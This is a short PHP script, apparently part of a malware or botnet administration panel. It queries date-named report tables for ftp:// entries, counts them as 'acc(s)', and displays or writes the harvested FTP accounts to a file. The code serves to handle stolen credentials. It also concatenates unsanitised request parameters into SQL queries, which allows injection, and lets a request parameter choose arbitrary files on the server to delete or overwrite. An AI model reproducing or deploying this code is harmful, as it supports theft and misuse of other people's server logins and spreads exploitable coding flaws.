<?php

set_time_limit(0);

$date = $_GET['dt'];
if (!@$date)
	exit;
$limit = $_GET['lm'];
if ((@$limit) && $limit) {
	$sqlp0 = " LIMIT $limit";
}
$file = $_GET['file'];
$kill = $_GET['k'];

require_once 'mod_dbase.php';
require_once 'mod_strenc.php';
require_once 'mod_file.php';

$dbase = db_open();



$sql = "SELECT DISTINCT func_data"
     . "  FROM rep2_$date"
	 . " WHERE func_data LIKE 'ftp://%'"
	 . $sqlp0;
$res = mysqli_query($dbase, $sql);
if ((!(@($res))) || !mysqli_num_rows($res)) {
	echo 'No accounts were found';
	exit;
}
$cnt = mysqli_num_rows($res);
echo "<div align='left'><b>$cnt</b> acc(s)<br></div>";

if (!@$file) {
	echo "<textarea onmouseover='this.style.backgroundColor = \"white\"; this.style.height = this.scrollHeight + \"px\";' onmouseout='this.style.backgroundColor=\"#e7f2f6\"; this.style.height = \"100px\";' style=' border-width: 1px; width: 730px; height: 100px; background-color: #e7f2f6; color: #666666; ' >";
	while ( list($ftp) = mysqli_fetch_row($res) ) {
		echo "$ftp\n";
	}
	echo "</textarea>";
}
else {
	if (intval($kill) == 1) {
		if (file_exists($file))
		{
			if (@unlink($file))
				echo "'$file' was <font class='error'>DELETED</font>";
			else
				echo "<font class='error'>CANNOT</font> DELETE '$file'";
		}
	}
	while ( list($ftp) = mysqli_fetch_row($res) ) {
		$buf .= "$ftp\n";
	}
	if (writefile($file, $buf) === FALSE)
		echo "<font class='error'>CANNOT</font> dump ftps accs to '$file'";
}

db_close($dbase);

?>